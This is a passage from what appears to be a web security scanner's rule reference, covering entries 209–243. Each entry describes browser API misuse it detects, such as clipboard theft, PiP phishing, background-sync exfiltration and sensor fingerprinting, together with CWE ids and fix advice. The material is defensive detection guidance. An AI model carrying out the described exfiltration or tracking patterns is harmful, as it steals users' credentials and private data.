Auto clipboard read: navigator.clipboard.readText() on page load reads clipboard without user awareness — captures passwords, tokens, PII Paste event sniffing: paste event listener transmitting content silently exfiltrates whatever user recently copied Clipboard content to server: copied passwords, API keys, credit card numbers, or private text sent to remote endpoint Third-party clipboard access: analytics scripts reading or logging clipboard data for cross-site tracking Clipboard poisoning: writeText() injecting javascript: URLs or XSS payloads into clipboard for social engineering attacks

**How to fix:**
- Only read clipboard in direct response to a user paste gesture — never on page load or timers
- Never transmit clipboard content to remote endpoints or analytics systems
- Validate and sanitize any content written to clipboard via writeText() — reject protocol handlers and script tags
- Restrict clipboard permissions via Permissions Policy header for third-party iframes
- Log clipboard access attempts to security monitoring for anomaly detection

**References:** [↗](https://www.w3.org/TR/clipboard-apis/) · [↗](https://developer.mozilla.org/en-US/docs/Web/API/Clipboard_API)

---

### 209. Clipboard Read / Hijack Attack
**Module:** `clipboard_advanced_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-200** &nbsp;|&nbsp; **MITRE:** T1115

Detects clipboard.readText() exfiltration silently stealing clipboard contents (passwords, tokens), paste event data theft, clipboard hijacking via writeText() from URL parameters, and writing credentials to the shared clipboard.

**How to fix:**
- Only call clipboard.readText() in response to explicit user gesture (button click), never silently on page load
- Do not transmit paste event clipboardData to remote endpoints
- Never write credential values to clipboard without explicit user action
- Validate clipboard.writeText() content — never source from URL parameters (prevents clipboard hijacking)

**References:** [↗](https://developer.mozilla.org/en-US/docs/Web/API/Clipboard_API) · [↗](https://cwe.mitre.org/data/definitions/200.html)

---

### 210. Fullscreen API Security
**Module:** `fullscreen_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-1021**

requestFullscreen() triggered automatically on page load: fullscreen entered without user gesture, violating security policy Fullscreen combined with auth/login/payment content: attacker spoofs browser chrome in fullscreen to phish credentials keyboard.lock() combined with fullscreen: user navigation escape paths locked, trapping user in fake fullscreen UI Data exfiltrated on fullscreenchange event: fullscreen entry used as covert trigger for analytics/exfiltration calls

**References:** [↗](https://fullscreen.spec.whatwg.org/) · [↗](https://cwe.mitre.org/data/definitions/1021.html)

---

### 211. Keyboard Lock Security
**Module:** `keyboard_lock_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-285**

Keyboard Lock API misuse — keyboard.lock([]) captures all system keys (Escape/Meta/F-keys) blocking user ability to exit page, KeyboardLayoutMap data transmitted for keyboard locale fingerprinting, keyboard.lock() auto-triggered on fullscreen/load.

**How to fix:**
- Never use keyboard.lock([]) — specify only the minimum keys required for the experience
- Do not lock system exit keys (Escape, Meta, F11) that users depend on to leave fullscreen
- Do not transmit getLayoutMap() keyboard locale data to remote analytics
- Only activate keyboard.lock() in response to explicit user fullscreen requests

**References:** [↗](https://wicg.github.io/keyboard-lock/) · [↗](https://cwe.mitre.org/data/definitions/285.html)

---

### 212. File System Access API Excessive Scope
**Module:** `file_system_access_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-552**

showDirectoryPicker grants full directory access: user may unknowingly grant read/write to all files in ~/Documents or ~/Desktop FileHandle stored in localStorage: XSS attacker reads persisted handles, accessing user files without another picker dialog Recursive directory delete: rm -rf equivalent in browser, irreversibly deletes user data File path transmitted to server: directory structure and file naming reveals user's local machine configuration startIn:'desktop' guides PII exposure: directing picker to Desktop/Documents increases chance of sensitive file selection

**How to fix:**
- Prefer showOpenFilePicker over showDirectoryPicker — request access to individual files, not entire directories
- Never store FileHandle objects in localStorage/sessionStorage — they should not persist across sessions
- Gate any .remove({recursive:true}) behind multiple confirmation dialogs with explicit content preview
- Never transmit file paths to server — only transmit file contents, and only what the user explicitly chose to upload
- Use startIn:'downloads' or a task-specific directory suggestion rather than broad directories like desktop or documents

**References:** [↗](https://wicg.github.io/file-system-access/) · [↗](https://developer.mozilla.org/en-US/docs/Web/API/File_System_Access_API)

---

### 213. Storage Bucket Security
**Module:** `storage_bucket_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-312**

Storage Bucket API misuse — credentials/tokens stored in persistent isolated buckets, bucket name from URL param enables attacker-controlled access, bucket enumeration transmitted to remote endpoint.

**How to fix:**
- Never store auth tokens, passwords, or session credentials in Storage Buckets
- Hardcode bucket names — never derive from URL parameters or user input
- Do not transmit storageBuckets.keys() results to external analytics endpoints
- Use expiration on Storage Buckets to limit credential persistence window

**References:** [↗](https://wicg.github.io/storage-buckets/) · [↗](https://cwe.mitre.org/data/definitions/312.html)

---

### 214. Storage Access Api Security
**Module:** `storage_access_api_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-359**

Storage Access API misuse — requestStorageAccess() used to read cross-site cookies/localStorage and exfiltrate to remote, automatic storage access requests without user gesture, hasStorageAccess() result transmitted as cross-site tracking signal, requestStorageAccessFor() target from URL parameter.

**How to fix:**
- Only request storage access in response to explicit user gesture events (click, etc.)
- Do not read cross-site storage immediately after requestStorageAccess() for exfiltration purposes
- Do not transmit hasStorageAccess() results to remote analytics as a cross-site tracking signal
- Never pass URL parameters as the origin argument to requestStorageAccessFor()

**References:** [↗](https://privacycg.github.io/storage-access/) · [↗](https://cwe.mitre.org/data/definitions/359.html)

---

### 215. OPFS Arbitrary Write / Credential Storage
**Module:** `opfs_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-552**

Write from URL param: OPFS file written with content from URL parameter — attacker injects arbitrary data into origin-private filesystem via URL manipulation Credentials written to OPFS: auth tokens/passwords written to OPFS files — credentials persisted in origin-private storage accessible to all origin scripts and service workers File content exfiltrated: OPFS file content read and transmitted to remote — sensitive private file data exfiltrated to attacker server Directory listing exfiltrated: file names from OPFS directory transmitted — private file inventory reveals structure of sensitive stored data Sync handle in main thread: FileSystemSyncAccessHandle used alongside main thread APIs — sync file handles are Worker-only; misuse indicates sandboxing bypass or prototype pollution attempt

**How to fix:**
- Never write content from URL parameters, hash, or searchParams to OPFS files
- Do not store authentication credentials, API keys, or session tokens in OPFS — use secure in-memory storage or cryptographic key stores
- Encrypt sensitive data before writing to OPFS — use Web Crypto API with a user-derived key
- Do not transmit OPFS file contents or directory listings to remote endpoints
- FileSystemSyncAccessHandle should only be used inside dedicated Web Workers — audit for main-thread usage

**References:** [↗](https://fs.spec.whatwg.org/) · [↗](https://developer.mozilla.org/en-US/docs/Web/API/File_System_API/Origin_private_file_system)

---

### 216. Cache API Sensitive Data Persistence
**Module:** `cache_api_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-312**

Auth tokens cached in Cache Storage: JWT/Bearer tokens persist after logout, recoverable by same-origin scripts Sensitive API endpoints cached: /api/user, /account responses stored in browser, accessible on shared devices after session ends No cache clear on logout: user data persists in Cache Storage until the cache is explicitly deleted Cache Storage accessible to service workers: malicious injected SW can read all cached responses including auth data Predictable cache names: attackers crafting XSS payloads target known cache names (e.g., 'auth-cache') for token extraction

**How to fix:**
- Never cache responses that include Authorization headers, Set-Cookie responses, or user-specific data
- Call caches.delete(CACHE_NAME) on logout for all caches containing user-specific responses
- Set Cache-Control: no-store on all authenticated API responses — prevents both HTTP cache and Cache API caching
- Use a versioned cache name and delete old versions during SW install to prevent stale auth data accumulation
- Audit service worker fetch handlers to ensure auth endpoints return fresh uncached responses

**References:** [↗](https://developer.mozilla.org/en-US/docs/Web/API/Cache) · [↗](https://www.w3.org/TR/service-workers/#cache-objects)

---

### 217. Notification Credential / Phishing Exposure
**Module:** `notification_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-312** &nbsp;|&nbsp; **MITRE:** T1566

Detects Notification body containing credentials (visible on OS lock screen), notification content from URL parameters enabling phishing, notificationclick exfiltration, and service worker showNotification with embedded credentials.

**How to fix:**
- Never embed password/token/credential values in notification title or body
- Validate notification content — never source from URL parameters (prevents notification phishing)
- Avoid transmitting notificationclick interaction data to analytics
- Use generic notification text — never include account-specific sensitive data

**References:** [↗](https://developer.mozilla.org/en-US/docs/Web/API/Notifications_API) · [↗](https://cwe.mitre.org/data/definitions/312.html)

---

### 218. Web OTP Interception / Leakage
**Module:** `web_otp_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-522**

OTP to analytics: one-time codes transmitted to third-party analytics endpoints compromise authentication bypasses OTP stored locally: localStorage/sessionStorage storage of OTPs defeats single-use guarantee — replay attacks possible No AbortController: OTP credential request without abort signal hangs indefinitely, blocking UI and consuming resources Auto-read on load: OTP API triggered on page load without user interaction starts SMS reading covertly OTP forwarded externally: forwarding OTP code to a non-same-origin endpoint hands attackers the authentication factor

**How to fix:**
- Never transmit OTP codes to analytics or third-party endpoints — they are authentication secrets
- Never store OTP codes in localStorage, sessionStorage, or cookies — use them immediately and discard
- Always use AbortController with a timeout when calling navigator.credentials.get({otp: ...})
- Only initiate OTP requests in response to user action (button click)
- Verify OTP codes server-side only — never trust client-side OTP validation

**References:** [↗](https://wicg.github.io/web-otp/) · [↗](https://developer.mozilla.org/en-US/docs/Web/API/OTPCredential)

---

### 219. Web Share API Data Leakage
**Module:** `web_share_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-200** &nbsp;|&nbsp; **MITRE:** T1567

Detects navigator.share() transmitting credentials via native share sheet, attacker-controlled share content from URL parameters enabling phishing, file sharing via share sheet, and open redirect via URL field in share payload.

**How to fix:**
- Never include password/token/API key in navigator.share() payload
- Validate share content — never source title/text/url directly from URL parameters
- Audit files shared via navigator.share() for sensitive document content
- Sanitize the url field in share payloads to prevent open redirect exploitation

**References:** [↗](https://developer.mozilla.org/en-US/docs/Web/API/Web_Share_API) · [↗](https://cwe.mitre.org/data/definitions/200.html)

---

### 220. Speech Synthesis Security
**Module:** `speech_synthesis_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-79**

Speech Synthesis API misuse — voice list enumerated and transmitted for browser fingerprinting, utterance text from URL parameter enables attacker-controlled audio phishing, social engineering text spoken to deceive users.

**How to fix:**
- Do not transmit speechSynthesis.getVoices() results to analytics endpoints
- Never source SpeechSynthesisUtterance text from URL parameters without strict sanitization
- Avoid TTS content that could be used for social engineering (password prompts, verify/authorize text)
- Audit all TTS content for potential phishing or deceptive audio messaging

**References:** [↗](https://w3c.github.io/speech-api/#tts-section) · [↗](https://cwe.mitre.org/data/definitions/79.html)

---

### 221. MSE Codec Injection / DRM Weakness
**Module:** `media_source_extension_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-74**

Video source from URL param: attacker crafts URL injecting malicious video blob that exploits browser codec parser vulnerabilities addSourceBuffer MIME from URL param: forcing arbitrary codec MIME type can crash codec handlers or trigger memory safety bugs ClearKey DRM: org.w3.clearkey has no real content protection — encryption keys distributed in plain JSON alongside encrypted content Cleartext media segments: HTTP media fetch vulnerable to MITM substituting segments with malicious content or tracking beacons Arbitrary blob URL injection: URL.createObjectURL(untrusted) bypasses CSP and can execute arbitrary media-triggered JavaScript

**How to fix:**
- Never derive media source URLs or MIME types from URL parameters — hardcode from allowlist
- Validate and allowlist addSourceBuffer() MIME types before calling — reject anything not in the expected set
- Use Widevine/FairPlay/PlayReady DRM for protected content — ClearKey is only for testing
- Fetch all media manifest and segment files over HTTPS with CORS enabled and SRI hashes where feasible
- Implement CSP media-src directive to restrict from which origins media content can be loaded

**References:** [↗](https://w3c.github.io/media-source/) · [↗](https://www.w3.org/TR/encrypted-media/)

---

### 222. Presentation API Security
**Module:** `presentation_api_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-200**

PresentationRequest URL from URL parameter: attacker controls which content is cast to the connected screen PresentationConnection.send() exfiltrates session/cookie/token data: auth credentials sent to secondary display context Auth/credential/payment content cast to external screen: sensitive data presented on potentially untrusted display presentationRequest.start() auto-triggered: unprompted screen casting initiation without user awareness

**References:** [↗](https://w3c.github.io/presentation-api/) · [↗](https://cwe.mitre.org/data/definitions/200.html)

---

### 223. Document PiP Sensitive Content / Auto-Open
**Module:** `document_pip_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-359**

Sensitive DOM in floating window: password fields, auth tokens, or card numbers cloned into PiP window visible across desktops Auto-open without gesture: requestWindow() on page load violates user-gesture requirement and can surprise users Parent DOM access from PiP: pipWindow.opener grants same-origin access back to the parent page from the floating context Data exfiltration via PiP: malicious script in PiP context can fetch data and transmit without user noticing the floating window Persistent UI after navigation: PiP windows survive page navigation — stale, misleading content may persist

**How to fix:**
- Never clone password fields, authentication tokens, or payment data into a PiP window
- Only call documentPictureInPicture.requestWindow() in response to explicit user gestures (click/keypress)
- Catch NotAllowedError from requestWindow() and handle gracefully
- Audit all JavaScript executing in PiP context — it has same-origin DOM access to the parent page
- Clear PiP window content on page navigation events to prevent stale UI leakage

**References:** [↗](https://wicg.github.io/document-picture-in-picture/) · [↗](https://developer.mozilla.org/en-US/docs/Web/API/Document_Picture-in-Picture_API)

---

### 224. Document PiP Window Cross-Context Exposure
**Module:** `document_pip_api_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-668**

Sensitive content in PiP: password/token/auth/payment content rendered in PiP window — displayed in uncontrolled floating context visible outside browser tab PiP accesses parent DOM via opener: pipWindow.opener.document — cross-context DOM read breaks expected window isolation Auth data via postMessage from PiP: session tokens transmitted via postMessage from PiP window — credentials exfiltrated through cross-context messaging URL param controls PiP content: requestWindow() with URL-param-derived settings — attacker manipulates PiP overlay dimensions or content Auto-opens on load: PiP window requested on DOMContentLoaded — unexpected floating overlay appears without user interaction

**How to fix:**
- Never render authentication tokens, passwords, or payment details inside PiP windows
- Restrict PiP window access to parent document — do not expose opener or parent references
- Validate origin of all postMessage events received from PiP window before processing
- Only open PiP windows in response to explicit user gestures (click, button)
- Set appropriate Permissions-Policy: document-picture-in-picture=() to restrict the API to trusted contexts

**References:** [↗](https://wicg.github.io/document-picture-in-picture/) · [↗](https://developer.chrome.com/docs/web-platform/document-picture-in-picture/)

---

### 225. Document Picture-in-Picture Security
**Module:** `document_picture_in_picture_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-1021**

documentPictureInPicture.requestWindow() triggered automatically: unprompted floating window created without user interaction Document PiP window displays auth/login/payment form: floating browser window used to spoof trusted UI and phish credentials PiP configuration from URL parameter: attacker-controlled window size and content in floating overlay Data exfiltrated on enterpictureinpicture event: PiP entry triggers covert data transmission

**References:** [↗](https://wicg.github.io/document-picture-in-picture/) · [↗](https://cwe.mitre.org/data/definitions/1021.html)

---

### 226. Launch Handler targetURL Injection / Redirect
**Module:** `launch_handler_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-601**

Open redirect via targetURL: launch handler uses targetURL directly as navigation target — attacker crafts PWA launch URL to redirect victim to phishing site XSS via targetURL to innerHTML: launch targetURL passed to innerHTML/outerHTML — DOM XSS through malicious PWA launch URL Script load from launch URL: targetURL used to dynamically import or load script — arbitrary remote code execution via crafted launch invocation Launch URL exfiltrated: targetURL (containing potentially sensitive path/params) transmitted to analytics — user's launch context sent to third party Launch URL stored unsanitized: targetURL written to localStorage without validation — persists attacker-controlled URL for future application use

**How to fix:**
- Validate launch params.targetURL against an allowlist before using it as a navigation target
- Never pass launch targetURL to innerHTML, outerHTML, document.write, or dynamic import()
- Do not transmit launch targetURL to analytics endpoints — it may contain sensitive path parameters
- Sanitize targetURL before storing to localStorage — treat it as untrusted external input
- Implement launch URL validation in the service worker fetch handler as an additional defense layer

**References:** [↗](https://wicg.github.io/web-app-launch/) · [↗](https://developer.mozilla.org/en-US/docs/Web/Manifest/launch_handler)

---

### 227. PWA Manifest Misconfiguration / Launch Hijack
**Module:** `pwa_manifest_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-601**

External start_url: PWA start_url is absolute external URL — installed PWA launches to attacker-controlled page instead of app Overly broad scope: scope is '/' (entire origin) — no path restriction; all origin URLs are within PWA context enabling unintended PWA behavior Sensitive params in shortcuts: shortcut URL contains token/auth query parameters — credentials embedded in manifest, visible to device OS Dangerous permissions in manifest: camera/microphone/geolocation/payment permissions declared — broad permissions granted at install time without per-use prompts handle_links preferred: all matching links from other apps intercepted — user navigates from external app and PWA opens without browser choice dialog

**How to fix:**
- Never use absolute external URLs in start_url — use relative paths within the same origin
- Restrict scope to the minimum required path prefix (e.g., '/app/') rather than '/'
- Remove authentication tokens and sensitive parameters from shortcut URLs in manifest
- Only declare permissions that are strictly necessary for core PWA functionality
- Set handle_links to 'auto' unless the app specifically requires intercepting all external links

**References:** [↗](https://www.w3.org/TR/appmanifest/) · [↗](https://developer.mozilla.org/en-US/docs/Web/Progressive_web_apps/Guides/Making_PWAs_installable)

---

### 228. Background Fetch Security
**Module:** `background_fetch_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-918**

Background Fetch API misuse — SSRF via URL param in backgroundFetch.fetch(), background credential upload, auth token POST via background channel, large file exfiltration pattern.

**How to fix:**
- Hardcode or strictly validate Background Fetch URLs — never source from URL parameters
- Do not include authentication tokens or sensitive storage data in background fetch requests
- Restrict Background Fetch endpoints using CSP connect-src directive
- Audit background fetch handlers in Service Workers for unintended data transmission

**References:** [↗](https://wicg.github.io/background-fetch/) · [↗](https://cwe.mitre.org/data/definitions/918.html)

---

### 229. Background Sync Deferred Exfiltration
**Module:** `background_sync_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-359**

Deferred exfiltration: background sync queues data from localStorage when offline and transmits on reconnect — bypasses network controls Sensitive sync tags: sync tag names are enumerable via getTags() — embedding user IDs or tokens leaks identity Periodic sync background collection: page runs code and makes network requests on a schedule without user interaction Short periodic interval: very short minInterval causes near-continuous background data collection Tag enumeration: getTags() reveals pending sync state to any code in the service worker scope

**How to fix:**
- Never embed user IDs, tokens, or sensitive identifiers in sync tag names — use opaque UUIDs
- Limit background sync to retrying failed user-initiated actions only — not speculative data collection
- Set generous minInterval on periodic sync (≥24h) and collect only non-sensitive telemetry
- Audit service worker sync handlers to ensure they only process pre-staged, minimal payloads
- Restrict Background Sync via Permissions Policy header in responses

**References:** [↗](https://wicg.github.io/background-sync/) · [↗](https://developer.mozilla.org/en-US/docs/Web/API/Background_Synchronization_API)

---

### 230. Periodic Background Sync Data Exfiltration
**Module:** `periodic_background_sync_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-311**

Sync tag from URL param: attacker registers arbitrary background sync tag via URL manipulation — silent recurring task registered by visiting a link Recurring data exfiltration: periodic sync handler reads localStorage/cookies and transmits to remote — continues exfiltrating after user leaves site Very short minInterval: near-continuous background sync requests without user awareness — bandwidth abuse and persistent background network access Location beacon: periodic sync beacons geolocation to server — continuous background location tracking after initial page visit Remote data injection: sync handler fetches attacker-controlled data and writes to local storage — persistent server-push injection into browser storage

**How to fix:**
- Never derive periodic sync tag or minInterval from URL parameters — hardcode all sync registration parameters
- Ensure periodicsync event handlers do not read and transmit user data to external endpoints
- Set minInterval to a reasonable value (e.g., 86400000ms = 24h) appropriate to the feature — avoid intervals under an hour
- Validate the source and content of any data fetched during periodic sync before writing to IndexedDB or localStorage
- Implement strict CSP and network request allowlists in service workers to prevent unauthorized transmissions

**References:** [↗](https://wicg.github.io/periodic-background-sync/) · [↗](https://developer.mozilla.org/en-US/docs/Web/API/Web_Periodic_Background_Synchronization_API)

---

### 231. Idle Detection User Presence Surveillance
**Module:** `idle_detection_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-359** &nbsp;|&nbsp; **MITRE:** T1592

Detects userState/screenState exfiltration (covert presence surveillance), continuous IdleDetector monitoring with remote transmission, idle threshold from URL parameters, and change event relay to remote servers.

**How to fix:**
- Never transmit IdleDetector userState/screenState to third-party endpoints
- Request Idle Detection permission only when genuinely needed for UX
- Do not relay IdleDetector change events to remote servers for behavioral profiling
- Validate IdleDetector.start() threshold — never source from URL parameters

**References:** [↗](https://developer.mozilla.org/en-US/docs/Web/API/Idle_Detection_API) · [↗](https://cwe.mitre.org/data/definitions/359.html)

---

### 232. WebXR Spatial Data / Room Capture
**Module:** `webxr_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-359**

Auto XR session: requestSession() on load starts XR without user gesture — violates browser security model Immersive AR camera: camera pass-through in AR mode captures real-world video of user's physical environment Depth sensing: depthSensing/rawCamera APIs create 3D map of user's room, objects, and physical layout Pose/position transmitted: user head position and orientation over time reveals movement patterns and physical setup Spatial data to analytics: XR tracking data sent to third parties enables physical-world user profiling

**How to fix:**
- Only call navigator.xr.requestSession() within a trusted user gesture handler
- Request minimum necessary XR features — avoid requestedFeatures like 'depth-sensing' or 'camera-access' unless essential
- Never transmit XR pose, position, or orientation data to analytics or third-party endpoints
- Call session.end() in component cleanup and on page visibility change
- Display clear consent UI explaining what sensor access an XR session requires before initiating

**References:** [↗](https://www.w3.org/TR/webxr/) · [↗](https://developer.mozilla.org/en-US/docs/Web/API/WebXR_Device_API)

---

### 233. Webgl Security
**Module:** `webgl_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-94**

WebGL API misuse — GLSL shader source from URL parameter (shader injection), GPU framebuffer data exfiltrated via readPixels/toDataURL, WebGL extension list transmitted for browser fingerprinting.

**How to fix:**
- Never source WebGL shader code from URL parameters or user input
- Do not transmit WebGL readPixels/toDataURL output to remote endpoints
- Avoid transmitting getSupportedExtensions() results to analytics
- Implement CSP to restrict fetch/beacon destinations from WebGL applications

**References:** [↗](https://www.khronos.org/webgl/) · [↗](https://cwe.mitre.org/data/definitions/94.html)

---

### 234. VideoDecoder / VideoEncoder API Security
**Module:** `video_decoder_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-200**

VideoDecoder timing transmitted remotely: codec decode latency used as hardware timing oracle for device fingerprinting VideoFrame pixel data exfiltrated: decoded video frame content sent to remote endpoint via fetch/sendBeacon Codec configured from URL parameter: attacker-controlled codec string passed to VideoDecoder.configure() EncodedVideoChunk loaded cross-origin without CORP: untrusted media data decoded without Cross-Origin-Resource-Policy

**References:** [↗](https://www.w3.org/TR/webcodecs/) · [↗](https://cwe.mitre.org/data/definitions/200.html)

---

### 235. AudioDecoder / AudioEncoder (WebCodecs) Security
**Module:** `audio_decoder_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-359**

AudioData frame content transmitted to remote: decoded audio buffer content exfiltrated via WebCodecs AudioDecoder/AudioEncoder configured from URL parameter: attacker-controlled codec string passed to hardware decoder Audio decode timing oracle: codec latency differences transmitted to profile hardware capabilities AudioEncoder connected to microphone with network transmission: microphone audio encoded and sent to attacker endpoint

**References:** [↗](https://www.w3.org/TR/webcodecs/) · [↗](https://cwe.mitre.org/data/definitions/359.html)

---

### 236. ImageDecoder (WebCodecs) Security
**Module:** `image_decoder_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-200**

Decoded ImageDecoder frame pixel data transmitted to remote: image content extracted via WebCodecs and exfiltrated ImageDecoder data source from URL parameter: attacker-controlled image bytes fed to hardware decoder Image decode timing measured and transmitted: hardware decoder latency used as device timing oracle Cross-origin image data decoded via WebCodecs: images loaded from cross-origin without CORP protection

**References:** [↗](https://www.w3.org/TR/webcodecs/) · [↗](https://cwe.mitre.org/data/definitions/200.html)

---

### 237. WebAssembly Security Risk
**Module:** `wasm_security_deep` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-494**

WASM URL from URL parameter: attacker substitutes malicious WASM module via URL manipulation WASM fetched over HTTP: MITM intercepts fetch, replaces binary with backdoored WASM module WebAssembly.compile(atob(...)): inline base64 WASM bypasses CSP connect-src directive eval() with WASM string: dynamic WASM generation evades static analysis and CSP script-src Wrong WASM Content-Type: some browsers refuse instantiation, causing runtime failures in production

**How to fix:**
- Never derive WASM module URLs from URL parameters — hardcode paths in application source
- Always fetch WASM modules over HTTPS — include in Subresource Integrity checks where possible
- Serve WASM files with Content-Type: application/wasm and X-Content-Type-Options: nosniff
- Add CSP connect-src and script-src directives that restrict which WASM modules can be loaded
- Audit inline base64 WASM payloads for obfuscated code — treat as equivalent to inline scripts

**References:** [↗](https://webassembly.org/docs/security/) · [↗](https://owasp.org/www-project-top-ten/)

---

### 238. Motion Sensor Keystroke Inference
**Module:** `device_orientation_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-203** &nbsp;|&nbsp; **MITRE:** T1592

Detects orientation (alpha/beta/gamma) and motion (acceleration/rotationRate) data exfiltration for fingerprinting and gait analysis, and correlation with keypress events enabling side-channel credential theft via accelerometer.

**How to fix:**
- Do not transmit DeviceOrientationEvent or DeviceMotionEvent data to third-party endpoints
- Never correlate motion sensor data with keyboard input events — this enables keystroke inference
- Request explicit permission for device orientation/motion access where browsers support it

**References:** [↗](https://developer.mozilla.org/en-US/docs/Web/API/DeviceOrientationEvent) · [↗](https://cwe.mitre.org/data/definitions/203.html)

---

### 239. Ambient Light Sensor Screen Inference
**Module:** `ambient_light_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-359**

Screen content inference: high-frequency illuminance sampling can reconstruct screen content via light reflected from the user's face Cross-site tracking: illuminance values shared with analytics build an environment fingerprint persistent across sites High frequency config: sensor configured at >50 Hz enables timing-based side-channel attacks Missing error handling: sensor availability varies by OS permission — unhandled errors expose fallback paths Device environment profiling: ambient light patterns (day/night, indoor/outdoor) linked to user identity over time

**How to fix:**
- Avoid sampling AmbientLightSensor at high frequency (>10 Hz) — batch samples and round values
- Never transmit illuminance or lux values to analytics or advertising endpoints
- Cap sensor frequency at 10 Hz or lower and quantize readings to reduce precision
- Handle SecurityError and NotAllowedError in sensor permission flows
- Declare the 'ambient-light-sensor' permissions policy in response headers to explicitly restrict cross-origin usage

**References:** [↗](https://www.w3.org/TR/ambient-light/) · [↗](https://developer.mozilla.org/en-US/docs/Web/API/AmbientLightSensor)

---

### 240. Generic Sensor Fingerprinting / Tracking
**Module:** `generic_sensor_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-359**

Device fingerprinting: gyroscope/magnetometer bias values are unique per physical device — enable persistent cross-site device identity Analytics sharing: XYZ orientation values sent to analytics build long-term device profile without user knowledge Indoor positioning: magnetometer heading infers indoor position and navigation without requiring GPS permission High frequency sampling: sensors configured at 100+ Hz provide timing resolution sufficient for acoustic eavesdropping research Missing permission handling: Generic Sensor API silently fails in restrictive permission policies without proper error handling

**How to fix:**
- Limit sensor frequency to the minimum required (≤10 Hz for most use cases)
- Never transmit raw XYZ sensor values to analytics or third-party endpoints
- Handle SecurityError and NotAllowedError from all Generic Sensor API instantiation
- Declare sensor permissions policy headers (gyroscope, magnetometer, accelerometer) explicitly
- Quantize sensor readings to reduce fingerprinting resolution before any use

**References:** [↗](https://www.w3.org/TR/generic-sensor/) · [↗](https://developer.mozilla.org/en-US/docs/Web/API/Sensor_APIs)

---

### 241. Battery Status Fingerprinting / Cross-Site Tracking
**Module:** `battery_status_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-359**

Battery fingerprinting: precise battery level (0-1 float) and charging state combination creates unique 112-bit-equivalent fingerprint Cross-site tracking: battery level stored in localStorage or cookies persists fingerprint across sessions and origins Analytics tracking: battery state shared with ad networks correlates user identity across browsers High-resolution timing: chargingTime/dischargingTime provides precise power supply state for Kalchschmidt-class fingerprinting Charging inference: charging pattern reveals user location (home/office) and device usage behaviour over time

**How to fix:**
- Avoid using navigator.getBattery() for any purpose that doesn't require direct power management
- Never transmit battery level, charging state, or timing values to analytics or advertising endpoints
- Do not store battery values in localStorage, sessionStorage, or cookies
- Browser vendors have already restricted this API — check if it is available before relying on it
- Declare Feature Policy to block battery access in third-party frames

**References:** [↗](https://www.w3.org/TR/battery-status/) · [↗](https://developer.mozilla.org/en-US/docs/Web/API/Battery_Status_API)

---

### 242. Screen Details API Multi-Monitor Fingerprinting
**Module:** `screen_details_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-200**

Screen details exfiltrated: getScreenDetails() result transmitted to analytics — full multi-monitor display hardware fingerprint sent to remote Screen label exfiltrated: ScreenDetailed.label or deviceId transmitted — unique hardware display identifier creates stable cross-session fingerprint Monitor count disclosed: screens.length or isExtended transmitted — number of connected monitors reveals workstation type and setup Resolution/depth exfiltrated: width/height/colorDepth/pixelRatio per screen transmitted — precise display configuration fingerprint Auto permission request: getScreenDetails() called on load — silently prompts user for screen permission without user action

**How to fix:**
- Never transmit getScreenDetails() results, screen labels, or screen counts to analytics or remote endpoints
- Only call getScreenDetails() in response to explicit user actions (e.g., open-in-new-window button)
- Restrict Screen Details API usage in CSP using Permissions-Policy: window-management=()
- Do not store screen hardware identifiers (label, deviceId) in localStorage or transmit to any endpoint
- Audit all PerformanceObserver and screen API usage for fingerprinting data leakage to third-party analytics

**References:** [↗](https://www.w3.org/TR/window-management/) · [↗](https://developer.mozilla.org/en-US/docs/Web/API/Window/getScreenDetails)

---

### 243. EyeDropper Screen Color Sampling
**Module:** `eyedropper_api_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-359**

Auto-trigger on load: opening EyeDropper without user gesture captures screen colors covertly at page load Color shared with analytics: sampled screen colors sent to third-party tracking endpoints for fingerprinting No consent notice: color data transmitted to server without informing the user of screen capture intent Rapid loop sampling: repeated EyeDropper calls in an animation loop reconstruct screen content over time Screen content inference: pixel-by-pixel sampling can reconstruct visible text, passwords, and sensitive documents

**How to fix:**
- EyeDropper.open() must only be called within a trusted user gesture handler (click, keypress)
- Display a visible consent banner before sampling and transmitting any color data
- Never send sampled color values to third-party analytics or advertising endpoints
- Avoid EyeDropper in loops — each call should be discrete and directly tied to a user action
- Store minimum necessary color data and discard immediately after the UX operation completes

